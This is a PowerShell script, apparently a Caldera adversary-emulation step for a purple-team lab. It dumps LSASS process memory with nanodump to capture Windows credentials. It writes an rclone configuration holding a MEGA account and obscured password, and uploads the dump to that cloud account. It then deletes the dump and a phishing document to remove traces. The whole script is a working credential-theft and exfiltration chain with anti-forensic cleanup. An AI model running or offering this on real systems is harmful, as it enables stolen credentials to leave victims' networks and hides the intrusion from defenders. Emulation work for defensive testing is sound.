# Dump LSASS with nanodump
$dumpPath = "$env:TEMP\lsass.dmp"
$phishingFile = "$env:TEMP\FORMULAIRE_L_ACADEMY.docx"
Start-Process -FilePath "$env:ProgramData\Microsoft\Windows\Caldera\nanodump\dist\nanodump.x64.exe" `
    -ArgumentList "--write $dumpPath --valid" -Wait


# Exfiltrate lsass.dmp via HTTP POST (multipart/form-data) to Caldera

$ErrorActionPreference = 'Stop'
# === CONFIGURATION DU RCLONE POUR MEGA ===
# Créer le dossier de configuration rclone
New-Item "$env:APPDATA\rclone" -ItemType Directory -Force | Out-Null
# Écrire le fichier rclone.conf (personnalise avec ton propre compte + mot de passe obscurci)
Set-Content "$env:APPDATA\rclone\rclone.conf" @"
[myMegaRemote]
type = mega
user = purple.lab.local@gmail.com
pass = Tf1CRTj6UL4Y449izAhIemgWwFEAdPW9SGXcVf_l
"@
# === FICHIER À EXFILTRER ===
# Ici tu peux pointer vers lsass.dmp ou un fichier compressé par une autre TTP
$dump = "$env:TEMP\lsass.dmp"
# $dump = "#{host.dir.compress}"  # ← si tu veux l'utiliser dynamiquement via Caldera avec un fact injecté
# === EXFILTRATION ===
# Exfiltration vers Mega (répertoire "test")
rclone --config "$env:APPDATA\rclone\rclone.conf" copy $dump myMegaRemote:test --max-size 1700k -v

# Cleanup
Start-Sleep -Seconds 5
Remove-Item $dumpPath -Force 
Start-Sleep -Seconds 60
Remove-Item $phishingFile -Force
